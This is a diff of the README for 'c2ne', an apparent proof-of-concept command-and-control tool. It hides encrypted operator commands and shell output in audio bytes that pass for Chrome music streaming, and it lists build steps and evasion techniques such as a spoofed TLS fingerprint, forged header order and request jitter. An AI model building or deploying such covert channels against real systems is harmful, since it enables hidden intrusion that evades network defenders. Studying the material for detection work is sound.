@@ -6,7 +6,6 @@ A covert command-and-control POC framework, that encloses operator commands into
 ## Setup
 ```sh
 openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -sha256 -days 365 -nodes -subj "/CN=c2ne.local"
-sudo apt install nginx
 #edit the config file
 GOOS=linux GOARCH=amd64 go build -o server server.go wav_heaer_helper.go aes-gcm_engine.go
 GOOS=linux GOARCH=amd64 go build -o client client.go aes-gcm_engine.go
@@ -15,8 +14,6 @@ GOOS=linux GOARCH=amd64 go build -o client client.go aes-gcm_engine.go
 #transfer the client to target
 ./client -target <IP>
 ```
-To edit the config, refer [config](nginx_config.md)
-Table of contents?
 
 ## Overview
 c2ne hides C2 traffic inside what looks like a Chrome browser streaming music from a self-hosted service. The operator commands from the server, and shell output from the client are encrypted and encoded bit-by-bit into the LSB of audio bytes. No separate C2 channel exists on the wire. The only observable traffic is what appeats to be a user listening to son, with periodic scrobble POSTs and track uploads.
@@ -24,7 +21,6 @@ c2ne hides C2 traffic inside what looks like a Chrome browser streaming music fr
 - TLS fingerprint identical to Chrome(uTLS `HelloChrome_Auto`)
 - HTTP/1.1 with handcrafted authentically-ordered Chrome headers on both client and server.
 - Jittered GET request, proportional to realistic streaming chunk consumption
-- nginx reverse proxy absorbs any header-ordering artifacts from Go's `http.ServeMux`
 - No custom ports, no unusual protocols. All traffic on port 443
 - AES-GCM engine, for stream-cipher,  key hardcoded into both client and server
 
@@ -63,8 +59,6 @@ Otherwise, send output via Audio file upload (`/api/v1/upload`)
 Both client and server use `uTLS` with `HelloChrome_Auto`. The ClientHello calues (cipher suites, extensions, elliptic curves) are identical to a real Chrome browzer session.
 ### HTTP headers
 Headers are handcrafted on both sides, to mirror Chrome's exact field names, values, and ordering
-### nginx reverse proxy
-The Go `htt.ServeMux` response path can emit headers in non-deterministic order(something to do with the usage of map in the omplementation), which is a know DPI fingerprint for Go HTTP servers. Placing nginx infront, absorbs thes. The response the client sees has standard, deterministically ordered headers that match a typical streaming service backend.
 ### Request Jitter
 GET chunks requests are not sent at a fixed interval. A random delay is introduced between each batch of GET request. The batch size of GET requests are proportionally calculated from the random delay, mimicing natural cadence of a media player refilling its buffer. This prevents entropy analysis flags.
 
